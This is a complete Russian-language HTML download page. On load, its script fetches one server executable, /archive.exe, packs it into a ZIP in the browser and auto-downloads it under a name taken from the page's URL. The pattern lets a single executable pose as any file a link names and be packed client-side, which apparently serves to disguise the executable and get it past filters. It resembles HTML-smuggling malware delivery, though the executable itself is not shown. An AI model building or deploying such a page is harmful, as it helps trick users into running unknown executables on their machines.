<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      background: #0f1115;
      color: #e8eaed;
      padding: 1.5rem;
    }
    .card {
      max-width: 28rem;
      text-align: center;
      padding: 2rem;
      border-radius: 12px;
      background: #1a1d24;
      border: 1px solid #2a2f3a;
    }
    h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 0.75rem; }
    p { color: #9aa0a6; font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.25rem; }
    .filename {
      display: inline-block;
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      font-size: 0.9rem;
      color: #8ab4f8;
      background: #0f1115;
      padding: 0.35rem 0.6rem;
      border-radius: 6px;
      margin-bottom: 1.25rem;
      word-break: break-all;
    }
    button {
      display: inline-block;
      border: none;
      cursor: pointer;
      background: #8ab4f8;
      color: #0f1115;
      font-weight: 600;
      font-size: 0.95rem;
      padding: 0.65rem 1.25rem;
      border-radius: 8px;
    }
    button:hover { filter: brightness(1.08); }
    button:disabled { opacity: 0.6; cursor: wait; }
    .status { margin-top: 1rem; font-size: 0.85rem; color: #9aa0a6; min-height: 1.25em; }
    .status.error { color: #f28b82; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Скачивание файла</h1>
    <p>Если загрузка не началась автоматически, нажмите кнопку ниже.</p>
    <div class="filename" id="filename">…</div>
    <div>
      <button type="button" id="downloadBtn">Скачать</button>
    </div>
    <p class="status" id="status">Подготовка загрузки…</p>
  </div>

  <script>
    (function () {
      "use strict";

      // Единственный файл на сервере
      var EXE_URL = "/archive.exe";

      function getBaseName() {
        var path = (window.location.pathname || "").replace(/\/+$/, "");
        var segment = path.split("/").filter(Boolean).pop() || "download";
        segment = segment
          .replace(/[\\/:*?"<>|]/g, "-")
          .replace(/\.+$/, "")
          .trim()
          .replace(/\.(exe|zip)$/i, "");
        return segment || "download";
      }

      var baseName = getBaseName();
      var exeName = baseName + ".exe";
      var zipName = baseName + ".zip";

      var filenameEl = document.getElementById("filename");
      var statusEl = document.getElementById("status");
      var btn = document.getElementById("downloadBtn");
      filenameEl.textContent = zipName + " → " + exeName;

      function setStatus(text, isError) {
        statusEl.textContent = text;
        statusEl.className = "status" + (isError ? " error" : "");
      }

      function triggerDownload(blob, name) {
        var url = URL.createObjectURL(blob);
        var a = document.createElement("a");
        a.href = url;
        a.download = name;
        a.rel = "noopener";
        document.body.appendChild(a);
        a.click();
        a.remove();
        setTimeout(function () {
          URL.revokeObjectURL(url);
        }, 2000);
      }

      /* CRC32 */
      var CRC_TABLE = (function () {
        var table = new Uint32Array(256);
        for (var n = 0; n < 256; n++) {
          var c = n;
          for (var k = 0; k < 8; k++) {
            c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
          }
          table[n] = c >>> 0;
        }
        return table;
      })();

      function crc32(bytes) {
        var c = 0xffffffff;
        for (var i = 0; i < bytes.length; i++) {
          c = CRC_TABLE[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
        }
        return (c ^ 0xffffffff) >>> 0;
      }

      function writeU16(arr, off, v) {
        arr[off] = v & 0xff;
        arr[off + 1] = (v >>> 8) & 0xff;
      }
      function writeU32(arr, off, v) {
        arr[off] = v & 0xff;
        arr[off + 1] = (v >>> 8) & 0xff;
        arr[off + 2] = (v >>> 16) & 0xff;
        arr[off + 3] = (v >>> 24) & 0xff;
      }

      /** Оборачивает bytes в ZIP (STORE, без сжатия), один файл внутри */
      function wrapInZip(fileName, fileBytes) {
        var nameBytes = new TextEncoder().encode(fileName);
        var crc = crc32(fileBytes);
        var size = fileBytes.length;
        var nameLen = nameBytes.length;

        var localLen = 30 + nameLen + size;
        var cdLen = 46 + nameLen;
        var out = new Uint8Array(localLen + cdLen + 22);
        var o = 0;

        // Local file header
        writeU32(out, o, 0x04034b50);
        writeU16(out, o + 4, 20);
        writeU16(out, o + 6, 0x0800); // UTF-8
        writeU16(out, o + 8, 0); // STORE
        writeU16(out, o + 10, 0);
        writeU16(out, o + 12, 0);
        writeU32(out, o + 14, crc);
        writeU32(out, o + 18, size);
        writeU32(out, o + 22, size);
        writeU16(out, o + 26, nameLen);
        writeU16(out, o + 28, 0);
        out.set(nameBytes, o + 30);
        out.set(fileBytes, o + 30 + nameLen);
        o = localLen;

        // Central directory
        writeU32(out, o, 0x02014b50);
        writeU16(out, o + 4, 20);
        writeU16(out, o + 6, 20);
        writeU16(out, o + 8, 0x0800);
        writeU16(out, o + 10, 0);
        writeU16(out, o + 12, 0);
        writeU16(out, o + 14, 0);
        writeU32(out, o + 16, crc);
        writeU32(out, o + 20, size);
        writeU32(out, o + 24, size);
        writeU16(out, o + 28, nameLen);
        writeU16(out, o + 30, 0);
        writeU16(out, o + 32, 0);
        writeU16(out, o + 34, 0);
        writeU16(out, o + 36, 0);
        writeU32(out, o + 38, 0);
        writeU32(out, o + 42, 0);
        out.set(nameBytes, o + 46);
        o += cdLen;

        // EOCD
        writeU32(out, o, 0x06054b50);
        writeU16(out, o + 4, 0);
        writeU16(out, o + 6, 0);
        writeU16(out, o + 8, 1);
        writeU16(out, o + 10, 1);
        writeU32(out, o + 12, cdLen);
        writeU32(out, o + 16, localLen);
        writeU16(out, o + 20, 0);

        return out;
      }

      async function downloadArchive() {
        btn.disabled = true;
        setStatus("Загрузка archive.exe…");

        try {
          var response = await fetch(EXE_URL, { cache: "no-cache" });
          if (!response.ok) {
            throw new Error("HTTP " + response.status + " — нет " + EXE_URL);
          }

          var exeBytes = new Uint8Array(await response.arrayBuffer());
          setStatus("Упаковка в " + zipName + "…");

          var zipBytes = wrapInZip(exeName, exeBytes);
          var blob = new Blob([zipBytes], { type: "application/zip" });

          triggerDownload(blob, zipName);
          setStatus("Готово: «" + zipName + "» (внутри «" + exeName + "»).");
        } catch (err) {
          console.error(err);
          setStatus((err && err.message) || "Ошибка. Нажмите кнопку ещё раз.", true);
        } finally {
          btn.disabled = false;
        }
      }

      btn.addEventListener("click", downloadArchive);
      downloadArchive();
    })();
  </script>
</body>
</html>
